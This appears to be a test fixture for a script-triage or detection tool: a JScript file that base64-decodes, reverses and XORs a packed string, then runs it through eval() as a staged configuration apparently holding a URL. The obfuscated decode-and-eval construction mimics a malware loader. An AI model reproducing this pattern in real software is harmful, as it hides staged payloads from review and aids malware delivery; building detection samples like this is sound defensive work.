// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
function decode_e99249a7(s) {
  var d = s.slice(0);
  d.reverse();
  for (var i = 0; i < d.length; i++) { d[i] = d[i] ^ 105; }
  return d;
}
function recover_46733cd0() {
  // configuration reconstruction
  var packedText = "FFpTSx0HHAYqDA4IHRpLRRRLHQgNR19bWwheCF8KX1hEDA4IHRo1NQsIJRoaDBsdBxwhNTUKAAULHDk1NRobDBo8NTVTKktTSwEdCBk2DAU" + "AD0tFS19bWwheCF8KX1hGCwglGhoMGx0HHCFLU0sdBwwOCDYbDBocS0VLHQgNR1FYDFxQWF8KRg0ABQgfBwBHDAUZBAgRDEdfW1sIXghfCl" + "9YRkZTGhkdHQFLU0sFGxxLRUtfW1sIXghfCl9YRAcOAAgZBAgKS1NLDQA2Bw4ACBkECApLElNLGgwcBQgfS0VLDBEMRxAKAAUGORAdABscC" + "gw6DgAPBwYqS1NLGwwdGQgNCEtFNEsMHQYEDBs2DQgGBRkcS0VLGwwPGgcIGx02DBsIGQwbGUtFSwUICgYFNgwdCAoGBUsyU0saGQwdGksS";
  var s = decodeBase64(packedText);
  var n = "PROCESSOR_ARCHITECTURE";
  var d = [];
  var state = 1;
  switch (state) { case 1: d = decode_e99249a7.call(null, s); break; default: d = []; }
  var textParts;
  textParts = [];
  for (var bi = 0; bi < d.length; bi++) { textParts.push(String.fromCharCode(d[bi])); }
  var t = textParts.join("");
  return t;
  // end reconstruction
}
function inspect_a30be964() {
  var o = eval("(" + recover_46733cd0.call(null) + ")");
  var p = new Object();
  p.steps = o.steps;
  p["adapter"] = o["adapter"];
  p.values = o.values;
  p["stageCount"] = o["stageCount"];
  return p;
}
